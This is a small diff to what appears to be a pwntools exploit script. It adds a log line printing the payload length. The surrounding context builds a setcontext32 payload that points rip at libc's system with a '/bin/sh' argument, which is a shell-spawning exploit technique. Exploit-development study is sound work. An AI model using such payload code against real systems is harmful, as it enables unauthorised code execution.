@@ -16,6 +16,7 @@ binsh = cast(int, next(libc.search(b"/bin/sh")))
 dest, payload = setcontext32(libc, regs={"rip": system, "rdi": binsh})
 
 log.info(f"{dest = :#x}")
+log.info(f"{len(payload) = }")
 
 for i in range(0, len(payload), 8):
     value = payload[i : i + 8].ljust(8, b"\0")
